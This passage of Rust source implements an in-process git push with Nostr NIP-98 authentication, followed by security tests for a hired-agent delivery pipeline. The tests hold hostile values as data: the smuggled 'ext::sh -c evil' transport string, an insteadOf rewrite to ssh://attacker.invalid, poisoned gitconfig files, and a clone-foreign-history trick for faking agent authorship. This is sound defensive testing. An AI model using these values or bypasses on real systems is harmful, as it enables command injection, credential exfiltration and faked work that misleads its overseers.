        static CLIENT: OnceLock<reqwest::blocking::Client> = OnceLock::new();
        CLIENT.get_or_init(|| {
            reqwest::blocking::Client::builder()
                .connect_timeout(Duration::from_secs(15))
                .timeout(Duration::from_secs(120))
                .build()
                .expect("build reqwest blocking client")
        })
    }

    /// Register the https smart subtransport exactly once for this process.
    fn ensure_registered() {
        REGISTER.call_once(|| {
            // SAFETY: libgit2 requires transport registration be externally synchronized with
            // other transport creation. `Once` guarantees a single registration, and mobee-core
            // uses git2 ONLY for this seller push, so overriding the `https` scheme affects no
            // other code path in the process.
            unsafe {
                let _ = git2::transport::register("https", |remote| {
                    let header = AUTH_HEADER.with(|cell| cell.borrow().clone());
                    Transport::smart(remote, true, NostrHttp { header })
                });
            }
        });
    }

    /// Push `refs/heads/<branch>` to `remote_url` in-process, returning the pushed commit OID.
    pub fn push_branch_inprocess(
        workdir: &Path,
        remote_url: &str,
        branch: &str,
        auth: &PushAuth,
    ) -> Result<String, SellerGitError> {
        ensure_registered();
        let header = nip98_authorization_header(remote_url, &auth.secret_key_hex)?;

        let repo = Repository::open(workdir)
            .map_err(|error| SellerGitError::Io(format!("open workdir repo: {error}")))?;
        let mut remote = repo
            .remote_anonymous(remote_url)
            .map_err(|error| SellerGitError::Io(format!("anonymous remote: {error}")))?;

        let refspec = format!("refs/heads/{branch}:refs/heads/{branch}");
        let rejection: std::rc::Rc<RefCell<Option<String>>> =
            std::rc::Rc::new(RefCell::new(None));
        let mut callbacks = RemoteCallbacks::new();
        {
            let rejection = rejection.clone();
            callbacks.push_update_reference(move |refname, status| {
                if let Some(message) = status {
                    *rejection.borrow_mut() = Some(format!("{refname}: {message}"));
                }
                Ok(())
            });
        }
        let mut options = PushOptions::new();
        options.remote_callbacks(callbacks);

        AUTH_HEADER.with(|cell| *cell.borrow_mut() = Some(header));
        let push_result = remote.push(&[refspec.as_str()], Some(&mut options));
        AUTH_HEADER.with(|cell| *cell.borrow_mut() = None);
        drop(options);
        push_result.map_err(map_push_error)?;

        let rejected = rejection.borrow().clone();
        if let Some(message) = rejected {
            return Err(SellerGitError::AuthFailed(format!(
                "remote rejected ref {message}"
            )));
        }

        let oid = repo
            .revparse_single(&format!("refs/heads/{branch}"))
            .and_then(|object| object.peel_to_commit())
            .map(|commit| commit.id().to_string())
            .map_err(|error| SellerGitError::Io(format!("resolve pushed oid: {error}")))?;
        if oid.len() < 40 || !oid.chars().all(|c| c.is_ascii_hexdigit()) {
            return Err(SellerGitError::Io(format!("unexpected commit oid {oid:?}")));
        }
        Ok(oid)
    }

    /// Map a libgit2 push error to a scrubbed [`SellerGitError`]. Auth/permission signals map
    /// to `AuthFailed` (fail-closed, parity with the system-git path); the secret is never in
    /// a git2 error, so no redaction is needed.
    fn map_push_error(error: git2::Error) -> SellerGitError {
        let lowered = error.message().to_ascii_lowercase();
        if lowered.contains("401")
            || lowered.contains("403")
            || lowered.contains("authentication")
            || lowered.contains("unauthorized")
            || lowered.contains("forbidden")
            || lowered.contains("permission")
        {
            SellerGitError::AuthFailed(format!("in-process push rejected: {}", error.message()))
        } else {
            SellerGitError::Io(format!("in-process push failed: {}", error.message()))
        }
    }

    /// rustls smart-HTTP subtransport that injects the NIP-98 header captured at push time.
    struct NostrHttp {
        header: Option<String>,
    }

    /// Map a smart-HTTP service to its `(service_name, is_post)` pair.
    fn service_parts(service: Service) -> (&'static str, bool) {
        match service {
            Service::UploadPackLs => ("git-upload-pack", false),
            Service::UploadPack => ("git-upload-pack", true),
            Service::ReceivePackLs => ("git-receive-pack", false),
            Service::ReceivePack => ("git-receive-pack", true),
        }
    }

    /// Build the request URL for a service leg. POST legs hit `<base>/<service>`; the
    /// ref-advertisement (LS) legs hit `<base>/info/refs?service=<service>` — matching
    /// libgit2's built-in smart-HTTP transport (and what the relay strips back to the repo root).
    fn service_url(base: &str, name: &str, is_post: bool) -> String {
        let base = base.trim_end_matches('/');
        if is_post {
            format!("{base}/{name}")
        } else {
            format!("{base}/info/refs?service={name}")
        }
    }

    impl SmartSubtransport for NostrHttp {
        fn action(
            &self,
            url: &str,
            service: Service,
        ) -> Result<Box<dyn SmartSubtransportStream>, git2::Error> {
            let (name, is_post) = service_parts(service);
            let full_url = service_url(url, name, is_post);
            Ok(Box::new(HttpStream {
                header: self.header.clone(),
                url: full_url,
                service: name,
                is_post,
                sent: false,
                request_body: Vec::new(),
                response: None,
            }))
        }

        fn close(&self) -> Result<(), git2::Error> {
            Ok(())
        }
    }

    /// One request/response leg of the smart-HTTP flow. libgit2 writes the request body (POST
    /// legs), then reads the response; we buffer the writes and fire the HTTP request lazily on
    /// the first read (the standard buffer-then-send pattern for stateless smart HTTP).
    struct HttpStream {
        header: Option<String>,
        url: String,
        service: &'static str,
        is_post: bool,
        sent: bool,
        request_body: Vec<u8>,
        response: Option<reqwest::blocking::Response>,
    }

    impl HttpStream {
        fn send(&mut self) -> io::Result<()> {
            let client = http_client();
            let mut request = if self.is_post {
                client
                    .post(&self.url)
                    .header(
                        "Content-Type",
                        format!("application/x-{}-request", self.service),
                    )
                    .header("Accept", format!("application/x-{}-result", self.service))
                    .body(std::mem::take(&mut self.request_body))
            } else {
                client.get(&self.url).header("Accept", "*/*")
            };
            // identity encoding: never hand libgit2 a gzip stream it did not negotiate.
            request = request.header("Accept-Encoding", "identity");
            if let Some(header) = &self.header {
                request = request.header("Authorization", header);
            }
            let response = request
                .send()
                .map_err(|error| io::Error::other(format!("http request: {error}")))?;
            let status = response.status();
            if !status.is_success() {
                return Err(io::Error::other(format!(
                    "http status {} for {}",
                    status.as_u16(),
                    self.url
                )));
            }
            self.response = Some(response);
            Ok(())
        }
    }

    impl Read for HttpStream {
        fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
            if !self.sent {
                self.send()?;
                self.sent = true;
            }
            match self.response.as_mut() {
                Some(response) => response.read(buf),
                None => Ok(0),
            }
        }
    }

    impl Write for HttpStream {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            self.request_body.extend_from_slice(buf);
            Ok(buf.len())
        }

        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn ls_legs_hit_info_refs_post_legs_hit_service() {
            let base = "https://relay.example/git/owner/repo.git";
            let (name, is_post) = service_parts(Service::ReceivePackLs);
            assert_eq!(name, "git-receive-pack");
            assert!(!is_post);
            assert_eq!(
                service_url(base, name, is_post),
                "https://relay.example/git/owner/repo.git/info/refs?service=git-receive-pack"
            );

            let (name, is_post) = service_parts(Service::ReceivePack);
            assert!(is_post);
            assert_eq!(
                service_url(base, name, is_post),
                "https://relay.example/git/owner/repo.git/git-receive-pack"
            );
        }

        #[test]
        fn service_url_trims_one_trailing_slash_only() {
            assert_eq!(
                service_url("https://h/git/o/r/", "git-receive-pack", true),
                "https://h/git/o/r/git-receive-pack"
            );
        }

        /// LIVE proof (ignored by default): fetch a ref from the seller's own canonical repo
        /// then push it back UNCHANGED (no-op) — exercising the receive-pack POST auth handshake
        /// end-to-end through the in-process rustls transport. Never touches existing branches.
        /// Run: `MOBEE_SELLER_HOME=<home> cargo test -p mobee-core --features inprocess-push \
        ///   -- --ignored --nocapture live_noop_push_authenticates`
        #[test]
        #[ignore]
        fn live_noop_push_authenticates() {
            let home = std::path::PathBuf::from(
                std::env::var("MOBEE_SELLER_HOME").expect("set MOBEE_SELLER_HOME"),
            );
            let mobee_home = crate::home::bootstrap(&home).expect("bootstrap");
            let secret = crate::home::read_secret_key_hex(&mobee_home).expect("secret");
            let remote_url = mobee_home
                .config
                .seller
                .as_ref()
                .expect("seller config")
                .git_remote
                .clone();

            ensure_registered();
            let header = super::nip98_authorization_header(&remote_url, &secret).expect("header");

            let work = std::env::temp_dir().join(format!("mobee-live-noop-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&work);
            let repo = git2::Repository::init(&work).expect("init");
            let mut remote = repo.remote_anonymous(&remote_url).expect("anon remote");

            // Fetch all branches (upload-pack read is also NIP-98-gated) to learn a ref + oid.
            AUTH_HEADER.with(|c| *c.borrow_mut() = Some(header.clone()));
            let fetch = remote.fetch(
                &["+refs/heads/*:refs/remotes/origin/*"],
                None,
                None,
            );
            AUTH_HEADER.with(|c| *c.borrow_mut() = None);
            fetch.expect("in-process fetch (read auth)");

            // Pick the first fetched branch; mirror it to a local head at the SAME oid.
            let branches: Vec<(String, git2::Oid)> = repo
                .references_glob("refs/remotes/origin/*")
                .expect("refs")
                .filter_map(Result::ok)
                .filter_map(|r| {
                    let name = r.shorthand()?.trim_start_matches("origin/").to_owned();
                    Some((name, r.target()?))
                })
                .collect();
            let (branch, oid) = branches.first().cloned().expect("at least one remote branch");
            eprintln!("live: no-op pushing branch={branch} oid={oid}");
            repo.reference(&format!("refs/heads/{branch}"), oid, true, "noop")
                .expect("local head");

            let pushed = super::push_branch_inprocess(
                &work,
                &remote_url,
                &branch,
                &PushAuth { secret_key_hex: secret },
            )
            .expect("in-process no-op push");
            assert_eq!(pushed, oid.to_string(), "no-op push returns the unchanged oid");
            let _ = std::fs::remove_dir_all(&work);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::sync::atomic::{AtomicU64, Ordering};

    static NEXT: AtomicU64 = AtomicU64::new(0);

    fn temp(label: &str) -> std::path::PathBuf {
        let id = NEXT.fetch_add(1, Ordering::SeqCst);
        std::env::temp_dir().join(format!(
            "mobee-seller-git-{label}-{}-{id}",
            std::process::id()
        ))
    }

    fn init_repo(path: &Path) {
        fs::create_dir_all(path).expect("mkdir");
        let status = Command::new("git")
            .args(["init", "--initial-branch=main"])
            .current_dir(path)
            .status()
            .expect("git init");
        assert!(status.success());
        let _ = Command::new("git")
            .args(["config", "user.name", "Mobee Seller Test"])
            .current_dir(path)
            .status();
        let _ = Command::new("git")
            .args(["config", "user.email", "seller@example.invalid"])
            .current_dir(path)
            .status();
        fs::write(path.join("out.txt"), "hello\n").expect("write");
        assert!(
            Command::new("git")
                .args(["add", "out.txt"])
                .current_dir(path)
                .status()
                .unwrap()
                .success()
        );
        assert!(
            Command::new("git")
                .args(["commit", "-m", "seller delivery"])
                .current_dir(path)
                .status()
                .unwrap()
                .success()
        );
    }

    #[test]
    fn push_refuses_ssh_and_local_paths() {
        let root = temp("refuse");
        let home = temp("refuse-home");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        init_repo(&root);
        assert!(matches!(
            push_branch(&root, "git@example.invalid:repo.git", "main", &home),
            Err(SellerGitError::Transport(_))
        ));
        assert!(matches!(
            push_branch(&root, "/tmp/local.git", "main", &home),
            Err(SellerGitError::Transport(_))
        ));
        assert!(matches!(
            push_branch(&root, "ssh://example.invalid/repo.git", "main", &home),
            Err(SellerGitError::Transport(_))
        ));
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn push_to_local_https_style_bare_via_file_is_refused() {
        // file:// is not on allowlist — fail closed even for fixtures.
        let root = temp("file-refuse");
        let home = temp("file-refuse-home");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        init_repo(&root);
        let err = push_branch(
            &root,
            &format!("file://{}/remote.git", root.display()),
            "main",
            &home,
        )
        .expect_err("file refused");
        assert!(matches!(err, SellerGitError::Transport(_)));
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn preflight_push_probe_refuses_non_allowlisted_remote() {
        let home = temp("preflight-refuse-home");
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        for bad in [
            "git@example.invalid:repo.git",
            "ssh://example.invalid/repo.git",
            "/tmp/local.git",
            "ext::sh -c evil",
        ] {
            assert!(
                matches!(
                    preflight_push_probe(&home, bad, None),
                    Err(SellerGitError::Transport(_))
                ),
                "expected transport refuse for {bad}"
            );
        }
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn preflight_push_probe_fails_closed_on_unreachable_https_remote() {
        // No mutation, no hang: an allowlisted-but-unresolvable https remote must fail closed
        // (GIT_TERMINAL_PROMPT=0) rather than block boot. Proves the probe reaches the push.
        let home = temp("preflight-unreach-home");
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        let err = preflight_push_probe(
            &home,
            "https://mobee-preflight.invalid/git/owner/repo.git",
            None,
        )
        .expect_err("unreachable remote must fail closed");
        assert!(
            matches!(
                err,
                SellerGitError::AuthFailed(_) | SellerGitError::CommandFailed(_)
            ),
            "got {err:?}"
        );
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn allowlist_https_accepted_by_locator_gate() {
        assert_allowed_repo_locator("https://example.invalid/git/owner/repo.git").unwrap();
        assert_allowed_repo_locator("https://example.invalid/repo.git").unwrap();
    }

    #[test]
    fn gate10_missing_after_refuses() {
        let pk = "abcd".repeat(8);
        let identity = DeliveryAgentIdentity::for_seller(&pk);
        let err = require_agent_authored_delivery(
            Path::new("/tmp/unused-gate10"),
            Path::new("/tmp/unused-gate10-home"),
            &identity,
            None,
        )
        .expect_err("missing after");
        assert!(err.to_string().contains("no commit"), "{err}");
    }

    #[test]
    fn gate10_wired_clone_then_no_work_refuses() {
        // (a) Real workdir path: wipe stamped base, clone foreign repo, zero work → REFUSE.
        let workdir = temp("gate10-clone-noop");
        let home = temp("gate10-clone-noop-home");
        let foreign = temp("gate10-foreign-src");
        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
        let _ = fs::remove_dir_all(&foreign);
        fs::create_dir_all(&home).expect("home");

        let pk = "11".repeat(32);
        let identity = DeliveryAgentIdentity::for_seller(&pk);
        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");

        // Foreign repo with non-agent authors (the clone-only payload).
        fs::create_dir_all(&foreign).expect("foreign mkdir");
        assert!(
            Command::new("git")
                .args(["init", "--initial-branch=main"])
                .current_dir(&foreign)
                .status()
                .unwrap()
                .success()
        );
        let _ = Command::new("git")
            .args(["config", "user.name", "Upstream Author"])
            .current_dir(&foreign)
            .status();
        let _ = Command::new("git")
            .args(["config", "user.email", "upstream@example.invalid"])
            .current_dir(&foreign)
            .status();
        fs::write(foreign.join("payload.txt"), "unchanged upstream tree\n").expect("write");
        assert!(
            Command::new("git")
                .args(["add", "payload.txt"])
                .current_dir(&foreign)
                .status()
                .unwrap()
                .success()
        );
        assert!(
            Command::new("git")
                .args(["commit", "-m", "upstream"])
                .current_dir(&foreign)
                .status()
                .unwrap()
                .success()
        );

        // Exploit: wipe stamped .git and clone foreign history into the job workdir.
        let _ = fs::remove_dir_all(workdir.join(".git"));
        assert!(
            Command::new("git")
                .args(["clone", "--", foreign.to_str().expect("utf8"), "."])
                .current_dir(&workdir)
                .status()
                .unwrap()
                .success()
        );

        let after = try_head_oid(&workdir, &home).expect("clone left a HEAD");
        let err = require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
            .expect_err("clone-then-no-work must refuse");
        assert!(
            err.to_string().contains("not agent-authored")
                || err.to_string().contains("foreign"),
            "expected authorship refuse, got: {err}"
        );

        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
        let _ = fs::remove_dir_all(&foreign);
    }

    #[test]
    fn gate10_wired_agent_authored_nonempty_accepts() {
        // (b) Legit empty-base agent work under the stamp → ACCEPT.
        let workdir = temp("gate10-ok");
        let home = temp("gate10-ok-home");
        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");

        let pk = "22".repeat(32);
        let identity = DeliveryAgentIdentity::for_seller(&pk);
        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");
        // Empty base: no HEAD yet.
        assert!(try_head_oid(&workdir, &home).is_none());

        fs::write(workdir.join("out.txt"), "agent did the work\n").expect("write");
        assert!(
            Command::new("git")
                .args(["add", "out.txt"])
                .current_dir(&workdir)
                .env("GIT_AUTHOR_NAME", &identity.name)
                .env("GIT_AUTHOR_EMAIL", &identity.email)
                .env("GIT_COMMITTER_NAME", &identity.name)
                .env("GIT_COMMITTER_EMAIL", &identity.email)
                .status()
                .unwrap()
                .success()
        );
        assert!(
            Command::new("git")
                .args(["commit", "-m", "agent delivery"])
                .current_dir(&workdir)
                .env("GIT_AUTHOR_NAME", &identity.name)
                .env("GIT_AUTHOR_EMAIL", &identity.email)
                .env("GIT_COMMITTER_NAME", &identity.name)
                .env("GIT_COMMITTER_EMAIL", &identity.email)
                .status()
                .unwrap()
                .success()
        );

        let after = try_head_oid(&workdir, &home).expect("after");
        let accepted =
            require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
                .expect("legit agent work must accept");
        assert_eq!(accepted, after);

        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn gate10_wired_empty_tree_refuses() {
        let workdir = temp("gate10-empty-tree");
        let home = temp("gate10-empty-tree-home");
        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");

        let pk = "33".repeat(32);
        let identity = DeliveryAgentIdentity::for_seller(&pk);
        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");
        assert!(
            Command::new("git")
                .args(["commit", "--allow-empty", "-m", "empty"])
                .current_dir(&workdir)
                .env("GIT_AUTHOR_NAME", &identity.name)
                .env("GIT_AUTHOR_EMAIL", &identity.email)
                .env("GIT_COMMITTER_NAME", &identity.name)
                .env("GIT_COMMITTER_EMAIL", &identity.email)
                .status()
                .unwrap()
                .success()
        );
        let after = try_head_oid(&workdir, &home).expect("empty commit has HEAD");
        let err = require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
            .expect_err("empty tree must refuse");
        assert!(
            err.to_string().contains("empty tree"),
            "expected empty-tree refuse, got: {err}"
        );

        let _ = fs::remove_dir_all(&workdir);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn scrub_kills_global_xdg_and_home_insteadof() {
        // Prove HOME-independent neutralization: poison seller HOME gitconfig with
        // insteadOf; scrubbed_git must not surface it (empty GIT_CONFIG_GLOBAL +
        // GIT_CONFIG_NOSYSTEM + empty XDG_CONFIG_HOME — never trust $seller/.gitconfig).
        let root = temp("scrub-cfg");
        let home = temp("scrub-cfg-home");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        init_repo(&root);
        fs::write(
            home.join(".gitconfig"),
            "[url \"git@poison.invalid:\"]\n\tinsteadOf = https://github.com/\n",
        )
        .expect("poison home gitconfig");
        // Also drop a poisoned XDG tree under seller HOME (the path git would use if
        // XDG_CONFIG_HOME were unset and HOME=$seller). Scrub pins empty XDG instead.
        fs::create_dir_all(home.join(".config/git")).expect("xdg under home");
        fs::write(
            home.join(".config/git/config"),
            "[url \"git@xdg-poison.invalid:\"]\n\tinsteadOf = https://github.com/\n",
        )
        .expect("poison home xdg gitconfig");

        let listed = scrubbed_git(&root, &home, ["config", "--list", "--show-origin"])
            .expect("scrubbed config --list");
        assert!(listed.status.success(), "config --list failed");
        let text = String::from_utf8_lossy(&listed.stdout).to_lowercase();
        assert!(
            !text.contains("insteadof"),
            "scrub leaked insteadOf into config list:\n{text}"
        );
        assert!(
            !text.contains("poison.invalid"),
            "scrub leaked poisoned host into config list:\n{text}"
        );

        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn push_refuses_agent_planted_local_insteadof_ssh() {
        // Transport bypass: hired agent authors local `.git/config` insteadOf that
        // rewrites allowlisted https → ssh. Allowlist sees the original https string;
        // protocol.ssh.allow=never on scrubbed_git must still kill the rewritten push.
        let root = temp("local-insteadof");
        let home = temp("local-insteadof-home");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        init_repo(&root);

        // Plant LOCAL insteadOf (survives global/XDG/system scrub).
        let plant = Command::new("git")
            .args([
                "config",
                "--local",
                r#"url.ssh://attacker.invalid/.insteadOf"#,
                "https://",
            ])
            .current_dir(&root)
            .status()
            .expect("plant local insteadOf");
        assert!(plant.success(), "failed to plant local insteadOf");

        // Without protocol lockdown this would attempt ssh://attacker… and hang/exfil.
        let err = push_branch(
            &root,
            "https://example.invalid/git/owner/repo.git",
            "main",
            &home,
        )
        .expect_err("local insteadOf→ssh must not push");
        match &err {
            SellerGitError::AuthFailed(_) | SellerGitError::CommandFailed("push") => {}
            other => panic!("expected push refuse after insteadOf→ssh, got: {other:?}"),
        }

        // Confirm scrubbed push stderr mentions protocol/ssh deny (not silent success).
        let _ = scrubbed_git(
            &root,
            &home,
            [
                "remote",
                "remove",
                "origin",
            ],
        );
        let _ = scrubbed_git(
            &root,
            &home,
            [
                "remote",
                "add",
                "origin",
                "https://example.invalid/git/owner/repo.git",
            ],
        );
        let push = scrubbed_git(&root, &home, ["push", "-u", "origin", "main"]).expect("spawn");
        assert!(!push.status.success(), "scrubbed push must fail under insteadOf→ssh");
        let stderr = String::from_utf8_lossy(&push.stderr).to_lowercase();
        assert!(
            stderr.contains("protocol") || stderr.contains("ssh") || stderr.contains("not allowed"),
            "expected protocol.ssh deny in stderr, got:\n{stderr}"
        );

        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    // ── Piece-10 fork-from-base: allowlist + range-scoped authorship gate ──────────────────────
    fn commit_as(dir: &Path, name: &str, email: &str, path: &str, content: &str, msg: &str) -> String {
        let full = dir.join(path);
        if let Some(parent) = full.parent() {
            fs::create_dir_all(parent).expect("mkdir parent");
        }
        fs::write(&full, content).expect("write");
        assert!(Command::new("git").args(["add", "-A"]).current_dir(dir).status().unwrap().success());
        assert!(Command::new("git")
            .args(["commit", "-m", msg])
            .current_dir(dir)
            .env("GIT_AUTHOR_NAME", name)
            .env("GIT_AUTHOR_EMAIL", email)
            .env("GIT_COMMITTER_NAME", name)
            .env("GIT_COMMITTER_EMAIL", email)
            .status()
            .unwrap()
            .success());
        let out = Command::new("git").args(["rev-parse", "HEAD"]).current_dir(dir).output().unwrap();
        String::from_utf8(out.stdout).unwrap().trim().to_owned()
    }

    #[test]
    fn init_contribution_workdir_refuses_ext_base() {
        let root = temp("contrib-ext");
        let home = temp("contrib-ext-home");
        let identity = DeliveryAgentIdentity::for_seller(&"aa".repeat(32));
        let err = init_contribution_workdir(
            &root,
            &home,
            &identity,
            "ext::sh -c evil",
            "main",
            &"a".repeat(40),
            "mobee/contribution/job",
            None,
        )
        .expect_err("ext base must be refused by the transport allowlist");
        assert!(matches!(err, SellerGitError::Transport(_)), "got {err}");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn require_agent_authored_contribution_scopes_gate_to_range() {
        let root = temp("contrib-range");
        let home = temp("contrib-range-home");
        let identity = DeliveryAgentIdentity::for_seller(&"bb".repeat(32));
        init_repo(&root); // base commit authored by "Mobee Seller Test" (foreign to the stamp)
        let base_oid = {
            let out = Command::new("git").args(["rev-parse", "HEAD"]).current_dir(&root).output().unwrap();
            String::from_utf8(out.stdout).unwrap().trim().to_owned()
        };
        // Agent commit ON TOP of base, authored by the STAMPED identity.
        let after = commit_as(&root, &identity.name, &identity.email, "src/x.rs", "work\n", "agent work");
        // Range gate passes (base is foreign, but base_oid..HEAD is all agent-authored).
        require_agent_authored_contribution(&root, &home, &identity, &base_oid, Some(&after))
            .expect("agent-authored range must pass despite foreign base");

        // A foreign commit on top of base ⇒ refuse.
        let foreign = commit_as(&root, "Stranger", "x@evil.invalid", "src/y.rs", "sneaky\n", "foreign");
        assert!(require_agent_authored_contribution(&root, &home, &identity, &base_oid, Some(&foreign)).is_err());

        // HEAD == base (no advancement) ⇒ refuse.
        assert!(require_agent_authored_contribution(&root, &home, &identity, &base_oid, Some(&base_oid)).is_err());
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    #[test]
    fn checkout_base_branch_from_oid_creates_fork_tip() {
        // Bug-1 regression: `git checkout -B <branch> <oid>` must NOT pass `--` before the
        // oid (that turns the oid into a pathspec → "not a commit ... cannot be created").
        // RED at 8253b70 (with the `--`); GREEN after removal.
        let root = temp("checkout-base");
        let home = temp("checkout-base-home");
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).expect("home");
        init_repo(&root); // leaves a commit whose oid is present in root's object db
        let base_oid = {
            let out = Command::new("git")
                .args(["rev-parse", "HEAD"])
                .current_dir(&root)
                .output()
                .unwrap();
            String::from_utf8(out.stdout).unwrap().trim().to_owned()
        };

        checkout_base_branch(&root, &home, "mobee/contribution/job", &base_oid)
            .expect("checkout of a valid base_oid onto the fork branch must succeed");

        // Now on the per-job branch, pointing at base_oid.
        let branch = Command::new("git")
            .args(["symbolic-ref", "--short", "HEAD"])
            .current_dir(&root)
            .output()
            .unwrap();
        assert_eq!(
            String::from_utf8(branch.stdout).unwrap().trim(),
            "mobee/contribution/job"
        );
        let head = Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(&root)
            .output()
            .unwrap();
        assert_eq!(String::from_utf8(head.stdout).unwrap().trim(), base_oid);

        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&home);
    }

    /// Args (after the program) of a built git Command, as owned Strings.
    fn cmd_args(cmd: &Command) -> Vec<String> {
        cmd.get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    /// True when `NOSTR_PRIVATE_KEY` is being SET (not removed) on the child.
    fn sets_nostr_key(cmd: &Command) -> bool {
        cmd.get_envs()
            .any(|(k, v)| k == std::ffi::OsStr::new("NOSTR_PRIVATE_KEY") && v.is_some())
    }

    #[test]
    fn fetch_base_wires_nip98_helper_for_relay_git_only() {
        // Bug-2 regression: the base fetch must present the seller NIP-98 credential helper
        // for relay-git targets (mobee relay requires auth for reads), and NOT for public /
        // anonymous https targets (which would otherwise break). Construction-level: inspect
        // the git Command the fetch path builds. RED if fetch_base_auth stops gating (drops
        // the auth), since the relay-git branch then wires no credential helper.
        let td = std::env::temp_dir();
        let auth = PushAuth {
            secret_key_hex: "ab".repeat(32),
        };
        let helper = Path::new("/opt/mobee/git-credential-nostr"); // injected — no resolution/env
        let relay_base = "https://relay.example/git/\
            abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789/job.git";
        let public_base = "https://example.invalid/repo.git";

        // (1) relay-git base → auth applied → credential helper + key wired on the fetch child.
        let eff = fetch_base_auth(Some(&auth), relay_base);
        assert!(eff.is_some(), "relay-git base must present NIP-98 auth");
        let relay_helper = eff.and(Some(helper));
        let cmd = build_scrubbed_command(&td, &td, ["fetch", relay_base], eff, relay_helper);
        let args = cmd_args(&cmd);
        assert!(
            args.iter().any(|a| a.starts_with("credential.helper=")),
            "relay-git fetch must wire credential.helper, got args: {args:?}"
        );
        assert!(
            args.iter().any(|a| a == "credential.useHttpPath=true"),
            "relay-git fetch must set credential.useHttpPath=true, got: {args:?}"
        );
        assert!(
            sets_nostr_key(&cmd),
            "relay-git fetch must inject NOSTR_PRIVATE_KEY on the child"
        );

        // (2) public https base → anonymous: no credential helper, no key on the fetch child.
        let eff_pub = fetch_base_auth(Some(&auth), public_base);
        assert!(eff_pub.is_none(), "public base must stay anonymous");
        let cmd_pub =
            build_scrubbed_command(&td, &td, ["fetch", public_base], eff_pub, eff_pub.and(Some(helper)));
        let args_pub = cmd_args(&cmd_pub);
        assert!(
            !args_pub.iter().any(|a| a.starts_with("credential.helper=")),
            "public fetch must NOT wire a credential helper, got: {args_pub:?}"
        );
        assert!(
            !sets_nostr_key(&cmd_pub),
            "public fetch must NOT inject NOSTR_PRIVATE_KEY"
        );

        // (3) no seller auth available → anonymous even for a relay-git base (never fail hard).
        assert!(
            fetch_base_auth(None, relay_base).is_none(),
            "absent seller auth must fall back to anonymous fetch"
        );
    }

    #[cfg(feature = "inprocess-push")]
    #[test]
    fn nip98_header_binds_repo_root_and_verifies() {
        use base64::Engine as _;
        use nostr_sdk::{Event, JsonUtil, Keys};

        let keys = Keys::generate();
        let secret = keys.secret_key().to_secret_hex();
        let remote = "https://relay.example/git/abcdef/repo.git";
        let header = nip98_authorization_header(remote, &secret).expect("build header");

        // Never leaks the secret; scheme is "Nostr <base64>".
        assert!(!header.contains(&secret), "secret leaked in header");
        let encoded = header.strip_prefix("Nostr ").expect("Nostr scheme");
        let json = base64::engine::general_purpose::STANDARD
            .decode(encoded)
            .expect("base64");
        let event = Event::from_json(&json).expect("event json");
        event.verify().expect("valid signature");
        assert_eq!(event.kind.as_u16(), 27235, "NIP-98 kind");

        let u = event
            .tags
            .iter()
            .find(|t| t.kind() == nostr_sdk::TagKind::custom("u"))
            .and_then(|t| t.content().map(str::to_owned))
            .expect("u tag");
        assert_eq!(u, remote, "u tag binds the repo-root the relay verifies");
        let method = event
            .tags
            .iter()
            .find(|t| t.kind() == nostr_sdk::TagKind::custom("method"))
            .and_then(|t| t.content().map(str::to_owned))
            .expect("method tag");
        assert_eq!(method, "POST");
    }

    #[cfg(feature = "inprocess-push")]
    #[test]
    fn nip98_header_rejects_bad_key() {
        let err = nip98_authorization_header("https://relay.example/git/o/r.git", "not-a-key")
            .expect_err("must reject");
        assert!(matches!(err, SellerGitError::AuthFailed(_)));
    }

    #[cfg(feature = "inprocess-push")]
    #[test]
    fn inprocess_push_env_override_forces_system_git() {
        let home = temp("inprocess-env");
        let _ = std::fs::remove_dir_all(&home);
        crate::home::bootstrap(&home).expect("bootstrap");
